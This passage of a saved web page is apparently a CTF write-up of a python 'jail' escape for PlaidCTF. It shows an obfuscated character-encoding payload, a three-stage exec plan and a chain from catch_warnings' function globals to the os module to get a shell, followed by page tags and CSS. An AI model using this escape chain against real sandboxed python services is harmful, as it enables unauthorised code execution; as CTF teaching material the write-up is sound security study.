+=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(~(~((~(~({}&lt;[=
+])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[=
+]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</spa=
+n><span class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s=
+">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%=
+((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&l=
+t;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><sp=
+an class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'</=
+span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%(~(~(=
+(~(~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
+&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span cl=
+ass=3D"s">'</span><span class=3D"si">%</span><span class=3D"se">\xcb</span>=
+<span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&=
+lt;({}&lt;[]))]%(~((~((~((~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))=
+&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[])=
+)),`</span><span class=3D"s">'</span><span class=3D"si">%</span><span class=
+=3D"se">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]:=
+:~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((((((({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&=
+lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`<=
+/span><span class=3D"s">'</span><span class=3D"si">%</span><span class=3D"s=
+e">\xcb</span><span class=3D"s">'</span><span class=3D"sb">`[{}&lt;[]::~(~(=
+{}&lt;[])&lt;&lt;({}&lt;[]))]%(~((((~(~(~({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&=
+lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;=
+&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span class=3D"si">%</sp=
+an><span class=3D"se">\xcb</span><span class=3D"s">'</span><span class=3D"s=
+b">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~(~(~({}&lt;[])&lt;&=
+lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;=
+&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))),`</span><span class=3D"s">'</span><span=
+ class=3D"si">%</span><span class=3D"se">\xcb</span><span class=3D"s">'</sp=
+an><span class=3D"sb">`[{}&lt;[]::~(~({}&lt;[])&lt;&lt;({}&lt;[]))]%((~(((~=
+(({}&lt;[])&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt;({}&lt;[]))&lt;&lt=
+;({}&lt;[]))&lt;&lt;({}&lt;[])))]`</span><span class=3D"p">[(({}</span><spa=
+n class=3D"o">&lt;</span><span class=3D"p">[])</span><span class=3D"o">&lt;=
+&lt;</span><span class=3D"p">({}</span><span class=3D"o">&lt;</span><span c=
+lass=3D"p">[]))::</span><span class=3D"o">~</span><span class=3D"p">(</span=
+><span class=3D"o">~</span><span class=3D"p">(({}</span><span class=3D"o">&=
+lt;</span><span class=3D"p">[])</span><span class=3D"o">&lt;&lt;</span><spa=
+n class=3D"p">({}</span><span class=3D"o">&lt;</span><span class=3D"p">[]))=
+</span><span class=3D"o">&lt;&lt;</span><span class=3D"p">({}</span><span c=
+lass=3D"o">&lt;</span><span class=3D"p">[]))]</span>
+</code></pre></div></div>
+
+<h1 id=3D"about-python-scopes">About python scopes</h1>
+
+<p>At this stage, and before trying to exploit anything, I think it might b=
+e useful
+to give a quick aper=C3=A7u of how python handles scopes. This won=E2=80=99=
+t explain
+everything there is to know about it and I strongly suggest you should read=
+ more
+about it is your are interested. If, however, you feel perfectly comfortabl=
+e
+with the way python handles and stores this stuff you may safely skip this
+section.</p>
+
+<p>There are two kinds of variables that I will talk about, namely <em>glob=
+al</em> and
+<em>local</em> variables. Of course, being python, there is no real differe=
+nce between
+the way a variable referring to a number, a class or a function, is handled=
+.</p>
+
+<h2 id=3D"globals">globals</h2>
+
+<p>What we usually call global variables are not in fact global in the same=
+ sense
+as global variables in C would be. They are only global relative to the mod=
+ule
+in which they are defined. When accessing them from outside there module yo=
+u
+would do for example: <code class=3D"highlighter-rouge">math.pi</code> to a=
+ccess the global variable named <code class=3D"highlighter-rouge">'pi'</cod=
+e> in
+the module <code class=3D"highlighter-rouge">'math'</code>.</p>
+
+<p>All the global variables in a module are stored in the module=E2=80=99s =
+<code class=3D"highlighter-rouge">__dict__</code> which
+is an attribute of the module. Modifing this <code class=3D"highlighter-rou=
+ge">__dict__</code> has the same effect as
+using <code class=3D"highlighter-rouge">setattr</code> on the module.</p>
+
+<p>One can get the current module=E2=80=99s globals doing <code class=3D"hi=
+ghlighter-rouge">sys.modules[__name__].__dict__</code>,
+or more simply by calling <code class=3D"highlighter-rouge">globals()</code=
+>.</p>
+
+<h2 id=3D"locals">locals</h2>
+
+<p>Local variables are those defined inside the scope of a function. In a w=
+ay
+similar to global variables, locals are stored in a dictionary that can be
+accessed through the <code class=3D"highlighter-rouge">f_locals</code> attr=
+ibute of the code frame in which the
+function is/was running. In the CPython implementation modifying the <code =
+class=3D"highlighter-rouge">f_locals</code>
+wont affect the actual locals.</p>
+
+<h2 id=3D"from-the-outside">from the outside</h2>
+
+<p>If we take a look at the code of <code class=3D"highlighter-rouge">math.=
+cos</code> we might expect it to use <code class=3D"highlighter-rouge">math=
+.pi</code>,
+but it will probably be simply referenced as <code class=3D"highlighter-rou=
+ge">pi</code>. When we call <code class=3D"highlighter-rouge">math.cos</cod=
+e> from
+somewhere outside of math, <code class=3D"highlighter-rouge">pi</code> wont=
+ be in the globals of the calling
+module. Its interesting to learn how <code class=3D"highlighter-rouge">cos<=
+/code> finds the reference on <code class=3D"highlighter-rouge">pi</code>. =
+During
+the declaration of the function, a reference to the current globals (those =
+of
+the module in which it is declared) is kept in the function=E2=80=99s <code=
+ class=3D"highlighter-rouge">func_globals</code>
+attribute.</p>
+
+<h1 id=3D"exploiting">Exploiting</h1>
+
+<p>We are now able to run code quiet easily and the character problems are =
+mostly
+solved. (We still can=E2=80=99t use some characters but we shall do without=
+ them)
+However, some limits still remain. No builtins, no access to modules, and a
+character limit. Let=E2=80=99s solve that last problem first, that way it w=
+on=E2=80=99t bother
+us afterwards.</p>
+
+<h2 id=3D"solving-the-length-limit">Solving the length limit</h2>
+
+<p>To achieve this we shall add a third execution stage, the second stage (=
+the
+original exec statement), which can be triggered as many times as we want,
+will be tasked with building the final payload. For this it will need to st=
+ore
+the query parts somewhere, and concatenate the new parts as they arrive.</p=
+>
+
+<p>We need a place to store stuff where we can comeback in the next exec. F=
+inding
+a place where we can comeback is easy.</p>
+
+<p>If you have ever done any kind of python jail-escaping the following sho=
+uld be
+familiar to you.</p>
+
+<div class=3D"language-python highlighter-rouge"><div class=3D"highlight"><=
+pre class=3D"highlight"><code><span class=3D"p">()</span><span class=3D"o">=
+.</span><span class=3D"n">__class__</span><span class=3D"o">.</span><span c=
+lass=3D"n">__base__</span><span class=3D"o">.</span><span class=3D"n">__sub=
+classes__</span><span class=3D"p">()</span>
+</code></pre></div></div>
+
+<p>This get=E2=80=99s the <code class=3D"highlighter-rouge">tuple</code>=E2=
+=80=99s type=E2=80=99s (<code class=3D"highlighter-rouge">().__class__</cod=
+e>) parent (<code class=3D"highlighter-rouge">__base__</code>) which is
+<code class=3D"highlighter-rouge">object</code>, then lists all its subclas=
+ses that python knows of. Somewhere in those
+we should be able to find one which we are allowed to call <code class=3D"h=
+ighlighter-rouge">setattr</code> on. Indeed
+we are lucky and find:</p>
+
+<pre><code class=3D"language-pycon">&gt;&gt;&gt; ().__class__.__base__.__su=
+bclasses__()[-2]
+&lt;class 'codecs.IncrementalDecoder'&gt;
+
+&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[-2].test =3D "wapiflapi=
+"
+&gt;&gt;&gt; print ().__class__.__base__.__subclasses__()[-2].test
+wapiflapi
+</code></pre>
+
+<p><strong>All the code should work on python 2.6.6, but it is trivial to a=
+dapt to other versions.</strong></p>
+
+<p>Neat, we can store stuff in this and come back to it later. That=E2=80=
+=99s all we need
+for our second stage, we are ready to receive the parts from eval, concaten=
+ate
+them into our storage and finally exec the whole payload when we are done.<=
+/p>
+
+<h4 id=3D"battle-plan">Battle plan:</h4>
+
+<ul>
+  <li>Stage 1, original <code class=3D"highlighter-rouge">eval()</code>
+    <ul>
+      <li>Decode input and generate the python code</li>
+      <li><strong>This bypasses the character limit</strong></li>
+    </ul>
+  </li>
+  <li>Stage 2, original <code class=3D"highlighter-rouge">exec</code>
+    <ul>
+      <li>Concatenate stage 1=E2=80=99s output</li>
+      <li>exec when ready</li>
+      <li><strong>This bypasses the length limit</strong></li>
+    </ul>
+  </li>
+  <li>Stage 3, <code class=3D"highlighter-rouge">exec</code> by stage 2
+    <ul>
+      <li>Actual payload, will hopefully get us a shell</li>
+      <li><strong>This gets out of jail</strong></li>
+    </ul>
+  </li>
+</ul>
+
+<p>This basically solves the problem at hand (the length limit), the code i=
+s
+pretty trivial and will be shown later when putting everything together. Le=
+t=E2=80=99s
+first find-out how to really escape from jail.</p>
+
+<h2 id=3D"getting-out">Getting out</h2>
+
+<p>We want a shell, we want <code class=3D"highlighter-rouge">system</code>=
+, <code class=3D"highlighter-rouge">execv</code>, <code class=3D"highlighte=
+r-rouge">fork</code>, <code class=3D"highlighter-rouge">dup</code>, in shor=
+t we want the
+<code class=3D"highlighter-rouge">os</code> module. Where can we find it? W=
+e need to look for a module or function that
+has a reference on <code class=3D"highlighter-rouge">os</code> or on someth=
+ing that has a reference on something like
+that. Here experience plays a big role, and we know from experience that th=
+e
+warnings module is loaded by default and has a lot of <em>nice</em> referen=
+ces. If we
+can get its globals we should be fine.</p>
+
+<p>What we normally try, and it worked for the NDH Prequals is :</p>
+
+<pre><code class=3D"language-pycon">&gt;&gt;&gt; [x for x in ().__class__._=
+_base__.__subclasses__() if x.__name__ =3D=3D "catch_warnings"][0]()._modul=
+e
+&lt;module 'warnings' from '/usr/lib/python2.7/warnings.pyc'&gt;
+</code></pre>
+
+<p>This gives us the module straightaway, no questions asked. It=E2=80=99s =
+so easy because
+<code class=3D"highlighter-rouge">catch_warnings</code> keeps a reference t=
+o its module. But it didn=E2=80=99t work this time
+because <code class=3D"highlighter-rouge">catch_warnings</code> uses <code =
+class=3D"highlighter-rouge">sys.modules</code> to get that reference, and t=
+hus it
+fails. (They are <code class=3D"highlighter-rouge">.clear()</code>ed, remem=
+ber?)</p>
+
+<pre><code class=3D"language-pytb">Traceback (most recent call last):
+  File "/Python-2.6.6/Lib/warnings.py", line 333, in __init__
+    self._module =3D sys.modules['warnings'] if module is None else module
+KeyError: 'warnings'
+</code></pre>
+
+<p>But we still have a way of getting that reference, we saw that functions=
+ kept
+a reference to the globals of the modules in which they where defined. We o=
+nly
+have to find a real function in <code class=3D"highlighter-rouge">catch_war=
+nings</code> and we should be good to go.</p>
+
+<p>After some searching we find out <code class=3D"highlighter-rouge">catch=
+_warnings.__repr__</code> is backed by a real
+function. <code class=3D"highlighter-rouge">__repr__</code> itself is an =
+=E2=80=98instancemethod=E2=80=99 not a function, but it=E2=80=99s
+trivial to get the function using <code class=3D"highlighter-rouge">__repr_=
+_.im_func</code></p>
+
+<p>Then it=E2=80=99s only a matter of getting <code class=3D"highlighter-ro=
+uge">warnings'</code> globals using <code class=3D"highlighter-rouge">func_=
+global</code> which
+is a reference to it.</p>
+
+<pre><code class=3D"language-pycon">&gt;&gt;&gt; g_warnings =3D [x for x in=
+ ().__class__.__base__.__subclasses__() if x.__name__ =3D=3D "catch_warning=
+s"][0].__repr__.im_func.func_globals
+&gt;&gt;&gt; print g_warnings["linecache"].os
+&lt;module 'os' from '/Python-2.6.6/Lib/os.pyc'&gt;
+</code></pre>
+
+<p><code class=3D"highlighter-rouge">warnings</code> imports <code class=3D=
+"highlighter-rouge">linecache</code> which in turn imports <code class=3D"h=
+ighlighter-rouge">os</code>. We don=E2=80=99t import
+anything and that is why doing things like this doesn=E2=80=99t disturb the=
+ broken
+mess caused by <code class=3D"highlighter-rouge">sys.modules.clear()</code>=
+.</p>
+
+<h1 id=3D"reunion">Reunion</h1>
+
+<p>Now we know everything. We know how to escape the jail, we know how to h=
+ave
+enough space to do so and we know how to use the characters we want to craf=
+t our
+code. The only think we miss is putting all this together. And it=E2=80=99s=
+ pretty easy.</p>
+
+<p>I=E2=80=99d like to thank PPP for their CTF, I really enjoyed it. Also t=
+hank you to all
+the people who helped me learning python and some of its <em>secrets</em>.<=
+/p>
+
+
+   =20
+
+
+
+<div class=3D"post-tags">
+ =20
+    <span>
+      <span class=3D"icon">
+        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
+24" xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
+7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
+/path>
+</svg>
+      </span>&nbsp;<span class=3D"tag-name">jail</span>
+    </span>
+ =20
+    <span>
+      <span class=3D"icon">
+        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
+24" xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
+7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
+/path>
+</svg>
+      </span>&nbsp;<span class=3D"tag-name">CTF</span>
+    </span>
+ =20
+    <span>
+      <span class=3D"icon">
+        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
+24" xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
+7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
+/path>
+</svg>
+      </span>&nbsp;<span class=3D"tag-name">PlaidCTF</span>
+    </span>
+ =20
+    <span>
+      <span class=3D"icon">
+        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
+24" xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
+7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
+/path>
+</svg>
+      </span>&nbsp;<span class=3D"tag-name">escape</span>
+    </span>
+ =20
+    <span>
+      <span class=3D"icon">
+        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
+24" xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
+7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
+/path>
+</svg>
+      </span>&nbsp;<span class=3D"tag-name">writeup</span>
+    </span>
+ =20
+    <span>
+      <span class=3D"icon">
+        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
+24" xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
+7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
+/path>
+</svg>
+      </span>&nbsp;<span class=3D"tag-name">python</span>
+    </span>
+ =20
+    <span>
+      <span class=3D"icon">
+        <svg fill=3D"#000000" height=3D"24" viewBox=3D"0 0 24 24" width=3D"=
+24" xmlns=3D"http://www.w3.org/2000/svg">
+    <path d=3D"M0 0h24v24H0z" fill=3D"none"></path>
+    <path d=3D"M17.63 5.84C17.27 5.33 16.67 5 16 5L5 5.01C3.9 5.01 3 5.9 3 =
+7v10c0 1.1.9 1.99 2 1.99L16 19c.67 0 1.27-.33 1.63-.84L22 12l-4.37-6.16z"><=
+/path>
+</svg>
+      </span>&nbsp;<span class=3D"tag-name">pyjail</span>
+    </span>
+ =20
+</div>
+  </div>
+
+ =20
+  <section class=3D"comments">
+    <h2>Comments</h2>
+   =20
+
+  </section>
+
+  <section class=3D"related">
+  <h2>Related Posts</h2>
+  <ul class=3D"posts-list">
+   =20
+      <li>
+        <h3>
+          <a href=3D"https://wapiflapi.github.io/2019/10/10/efficiency-reve=
+rse-engineering-with-ghidra.html">
+            Efficiency: Reverse Engineering with ghidra
+            <small>10 Oct 2019</small>
+          </a>
+        </h3>
+      </li>
+   =20
+      <li>
+        <h3>
+          <a href=3D"https://wapiflapi.github.io/2015/10/29/eight-byte-shel=
+l.html">
+            Eight bytes to get a shell.
+            <small>29 Oct 2015</small>
+          </a>
+        </h3>
+      </li>
+   =20
+      <li>
+        <h3>
+          <a href=3D"https://wapiflapi.github.io/2015/04/22/single-null-byt=
+e-heap-overflow.html">
+            Visualizing a single null-byte heap overflow exploitation
+            <small>22 Apr 2015</small>
+          </a>
+        </h3>
+      </li>
+   =20
+  </ul>
+</section>
+
+</div>
+
+    </main>
+
+    <!-- Optional footer content -->
+
+ =20
+
+<div id=3D"qb-sougou-search" style=3D"display: none; opacity: 0;"><p>=E6=90=
+=9C=E7=B4=A2</p><p class=3D"last-btn">=E5=A4=8D=E5=88=B6</p><iframe src=3D"=
+cid:frame-0845ECFCF2AC7A47E27ACEC12A3CF036@mhtml.blink"></iframe></div></bo=
+dy><div id=3D"qbTrans-pageTrans-dialog"><!----> <span class=3D"qbTrans-page=
+Trans-dialog-success" style=3D"display: none;"></span> <span class=3D"qbTra=
+ns-pageTrans-dialog-text">=E6=98=AF=E5=90=A6=E5=B0=86=E5=BD=93=E5=89=8D=E7=
+=BD=91=E9=A1=B5=E7=BF=BB=E8=AF=91=E6=88=90=E4=B8=AD=E6=96=87</span> <div cl=
+ass=3D"qbTrans-pageTrans-dialog-btn">=E7=BD=91=E9=A1=B5=E7=BF=BB=E8=AF=91</=
+div> <!----> <!----> <div class=3D"qbTrans-pageTrans-dialog-close"><span cl=
+ass=3D"qbTrans-pageTrans-dialog-close-text">=E5=85=B3=E9=97=AD</span> <span=
+ class=3D"qbTrans-pageTrans-dialog-arrow-down"></span> <ul class=3D"qbTrans=
+-pageTrans-dialog-menu" style=3D"display: none;"><li class=3D"qbTrans-pageT=
+rans-dialog-menu-item">=E6=AD=A4=E7=BD=91=E7=AB=99=E4=B8=8D=E5=86=8D=E6=8F=
+=90=E9=86=92</li> <li class=3D"qbTrans-pageTrans-dialog-menu-item">=E6=89=
+=80=E6=9C=89=E7=BD=91=E7=AB=99=E4=B8=8D=E5=86=8D=E6=8F=90=E9=86=92</li> <!-=
+---></ul></div></div></html>
+------MultipartBoundary--ILjgn3GondzfuDIOjQfrYqLpj4vcJIA0jfHucfqfRu----
+Content-Type: text/css
+Content-Transfer-Encoding: quoted-printable
+Content-Location: https://wapiflapi.github.io/assets/css/main.css
+
+@charset "utf-8";
+
+* { box-sizing: border-box; }
+
+html, body { margin: 0px; padding: 0px; }
+
+html { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, =
+Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", Ari=
+al, sans-serif; font-size: 1rem; line-height: 1.5; }
+
+@media (min-width: 49rem) {
+  html { font-size: 1.25rem; }
+}
+
+body { text-size-adjust: 100%; }
+
+main, article, section { display: block; }
+
+a { color: rgb(38, 139, 210); text-decoration: none; }
+
+a:hover, a:focus { text-decoration: underline; }
+
+a strong { color: inherit; }
+
+img { display: block; max-width: 100%; margin: 0px 0px 1rem; border-radius:=
+ 5px; height: auto; }
+
+table { margin-bottom: 1rem; width: 100%; font-size: 85%; border: 1px solid=
+ rgb(229, 229, 229); border-collapse: collapse; }
+
+td, th { padding: 0.25rem 0.5rem; border: 1px solid rgb(229, 229, 229); }
+
+th { text-align: left; }
+
+tbody tr:nth-child(2n+1) td, tbody tr:nth-child(2n+1) th { background-color=
+: rgb(249, 249, 249); }
+
+input[type=3D"text"], input[type=3D"email"], input[type=3D"search"], input[=
+type=3D"submit"], button { padding: 1em 1.5em; border: 1px solid rgb(229, 2=
+29, 229); border-radius: 300px; }
+
+button, input[type=3D"submit"] { cursor: pointer; background: transparent; =
+border-color: rgb(229, 229, 229); color: rgb(38, 139, 210); transition: col=
+or 0.6s ease-in-out 0s, border-color 0.6s ease-in-out 0s, background 0.6s e=
+ase-in-out 0s; }
+
+button:hover, input[type=3D"submit"]:hover { background: rgb(38, 139, 210);=
+ border-color: rgb(38, 139, 210); color: white; box-shadow: rgba(0, 0, 0, 0=
+.16) 1px 1px 1px; }
+
+h1, h2, h3, h4, h5, h6, .site-title { margin-bottom: 0.5rem; font-weight: 6=
+00; line-height: 1.25; color: rgb(49, 49, 49); text-rendering: optimizelegi=
+bility; }
+
+h1 { font-size: 2rem; }
+
+h2 { margin-top: 1rem; font-size: 1.5rem; }
+
+h3 { margin-top: 1.5rem; font-size: 1.25rem; }
+
+h4, h5, h6 { margin-top: 1rem; font-size: 1rem; }
+
+p { margin-top: 0px; margin-bottom: 1rem; }
+
+strong { color: rgb(48, 48, 48); }
+
+ul, ol, dl { margin-top: 0px; margin-bottom: 1rem; }
+
+dt { font-weight: bold; }
+
+dd { margin-bottom: 0.5rem; }
+
+hr { position: relative; margin: 1.5rem 0px; border-width: 1px 0px; border-=
+right-style: initial; border-left-style: initial; border-right-color: initi=
+al; border-left-color: initial; border-image: initial; border-top-style: so=
+lid; border-top-color: rgb(238, 238, 238); border-bottom-style: solid; bord=
+er-bottom-color: rgb(255, 255, 255); }
+
+abbr { font-size: 85%; font-weight: bold; color: rgb(85, 85, 85); text-tran=
+sform: uppercase; }
+
+abbr[title] { cursor: help; border-bottom: 1px dotted rgb(229, 229, 229); }
+
+blockquote { padding: 0.5rem 1rem; margin: 0.8rem 0px; color: rgb(122, 122,=
+ 122); border-left: 0.25rem solid rgb(229, 229, 229); }
+
+blockquote p:last-child { margin-bottom: 0px; }
+
+@media (min-width: 30em) {
+  blockquote { padding-right: 5rem; padding-left: 1.25rem; }
+}
+
+a[href^=3D"#fn:"], a[href^=3D"#fnref:"] { display: inline-block; margin-lef=
+t: 0.1rem; font-weight: bold; }
+
+.footnotes { margin-top: 2rem; font-size: 85%; }
+
+.lead { font-size: 1.25rem; font-weight: 300; }
+
+a svg, .icon svg { height: 1em; }
+
+a svg { fill: rgb(38, 139, 210); }
+
+.icon { vertical-align: middle; }
+
+.highlight .hll { background-color: rgb(255, 255, 204); }
+
+.highlight .c { color: rgb(153, 153, 153); }
+
+.highlight .err { color: rgb(170, 0, 0); background-color: rgb(255, 170, 17=
+0); }
+
+.highlight .k { color: rgb(0, 102, 153); }
+
+.highlight .o { color: rgb(85, 85, 85); }
+
+.highlight .cm { color: rgb(0, 153, 255); font-style: italic; }
+
+.highlight .cp { color: rgb(0, 153, 153); }
+
+.highlight .c1 { color: rgb(153, 153, 153); }
+
+.highlight .cs { color: rgb(153, 153, 153); }
+
+.highlight .gd { background-color: rgb(255, 204, 204); border: 1px solid rg=
+b(204, 0, 0); }
+
+.highlight .ge { font-style: italic; }
+
+.highlight .gr { color: red; }
+
+.highlight .gh { color: rgb(0, 51, 0); }
+
+.highlight .gi { background-color: rgb(204, 255, 204); border: 1px solid rg=
+b(0, 204, 0); }
+
+.highlight .go { color: rgb(170, 170, 170); }
+
+.highlight .gp { color: rgb(0, 0, 153); }
+
+.highlight .gu { color: rgb(0, 51, 0); }
+
+.highlight .gt { color: rgb(153, 204, 102); }
+
+.highlight .kc { color: rgb(0, 102, 153); }
+
+.highlight .kd { color: rgb(0, 102, 153); }
+
+.highlight .kn { color: rgb(0, 102, 153); }
+
+.highlight .kp { color: rgb(0, 102, 153); }
+
+.highlight .kr { color: rgb(0, 102, 153); }
+
+.highlight .kt { color: rgb(0, 119, 136); }
+
+.highlight .m { color: rgb(255, 102, 0); }
+
+.highlight .s { color: rgb(212, 73, 80); }
+
+.highlight .na { color: rgb(79, 159, 207); }
+
+.highlight .nb { color: rgb(51, 102, 102); }
+
+.highlight .nc { color: rgb(0, 170, 136); }
+
+.highlight .no { color: rgb(51, 102, 0); }
+
+.highlight .nd { color: rgb(153, 153, 255); }
+
+.highlight .ni { color: rgb(153, 153, 153); }
+
+.highlight .ne { color: rgb(204, 0, 0); }
+
+.highlight .nf { color: rgb(204, 0, 255); }
+
+.highlight .nl { color: rgb(153, 153, 255); }
+
+.highlight .nn { color: rgb(0, 204, 255); }
+
+.highlight .nt { color: rgb(47, 111, 159); }
+
+.highlight .nv { color: rgb(0, 51, 51); }
+
+.highlight .ow { color: rgb(0, 0, 0); }
+
+.highlight .w { color: rgb(187, 187, 187); }
+
+.highlight .mf { color: rgb(255, 102, 0); }
+
+.highlight .mh { color: rgb(255, 102, 0); }
+
+.highlight .mi { color: rgb(255, 102, 0); }
+
+.highlight .mo { color: rgb(255, 102, 0); }
+
+.highlight .sb { color: rgb(204, 51, 0); }
+
+.highlight .sc { color: rgb(204, 51, 0); }
+
+.highlight .sd { color: rgb(204, 51, 0); font-style: italic; }
+
+.highlight .s2 { color: rgb(204, 51, 0); }
+
+.highlight .se { color: rgb(204, 51, 0); }
+
+.highlight .sh { color: rgb(204, 51, 0); }
+
+.highlight .si { color: rgb(170, 0, 0); }
+
+.highlight .sx { color: rgb(204, 51, 0); }
+
+.highlight .sr { color: rgb(51, 170, 170); }
+
+.highlight .s1 { color: rgb(204, 51, 0); }
+
+.highlight .ss { color: rgb(255, 204, 51); }
+
+.highlight .bp { color: rgb(51, 102, 102); }
+
+.highlight .vc { color: rgb(0, 51, 51); }
+
+.highlight .vg { color: rgb(0, 51, 51); }
+
+.highlight .vi { color: rgb(0, 51, 51); }
+
+.highlight .il { color: rgb(255, 102, 0); }
+
+.css .o, .css .o + .nt, .css .nt + .nt { color: rgb(153, 153, 153); }
+
+code, pre { font-family: Menlo, Monaco, "Courier New", monospace; }
+
+code { padding: 0.25em 0.5em; font-size: 85%; color: rgb(191, 97, 106); bac=
+kground-color: rgb(249, 249, 249); border-radius: 3px; }
+
+pre { margin-top: 0px; margin-bottom: 1rem; }
+
+pre code { padding: 0px; font-size: 100%; color: inherit; background-color:=
+ transparent; }
+
+.highlight { padding: 1rem; margin-bottom: 1rem; font-size: 0.8rem; line-he=
+ight: 1.4; background-color: rgb(249, 249, 249); border-radius: 0.25rem; }
+
+.highlight pre { margin-bottom: 0px; overflow-x: auto; }
+
+.highlight .lineno { display: inline-block; padding-right: 0.75rem; padding=
+-left: 0.25rem; color: rgb(153, 153, 153); user-select: none; }
+
+pre { max-width: 100%; overflow-x: auto; }
+
+body { color: rgba(255, 255, 255, 0.75); background-color: rgb(32, 32, 32);=
+ background-image: linear-gradient(rgb(50, 50, 50), rgb(14, 14, 14)); displ=
+ay: flex; flex-direction: column; min-width: 100vw; min-height: 100vh; }
+
+#sidebar { flex: 0 0 auto; padding: 2rem; }
+
+#sidebar .site-title { font-family: "Abril Fatface", serif; font-weight: no=
+rmal; font-size: 1.25rem; margin-top: 0px; margin-bottom: 0.5rem; }
+
+#sidebar .site-title .back-arrow { margin-right: 0.5rem; }
+
+.container { flex: 1 1 auto; display: flex; flex-direction: column; }
+
+.container > .content { flex-grow: 1; padding-bottom: 4rem; }
+
+.content { background: rgb(255, 255, 255); color: rgb(81, 81, 81); padding:=
+ 2rem; }
+
+#sidebar header ~ *, #sidebar header ~ nav, #sidebar p.lead { display: none=
+; }
+
+.container > header { color: rgb(255, 255, 255); background: transparent; m=
+argin: -1.5rem 2rem 2rem; }
+
+.container > header h1, .container > header h2 { color: inherit; }
+
+.container > header h1:last-child, .container > header h2:last-child { marg=
+in-bottom: 0px; }
+
+.home #sidebar { text-align: center; }
+
+.home #sidebar .site-title { font-size: 3.25rem; }
+
+.home #sidebar header ~ *, .home #sidebar p.lead { display: block; }
+
+.home #sidebar header ~ nav { display: flex; }
+
+.home #sidebar > :last-child { margin-bottom: 0.5rem; }
+
+@media (min-width: 49rem) {
+  body { flex-direction: row; height: 100vh; overflow-y: auto; }
+  body > * { max-height: 100vh; overflow-y: auto; }
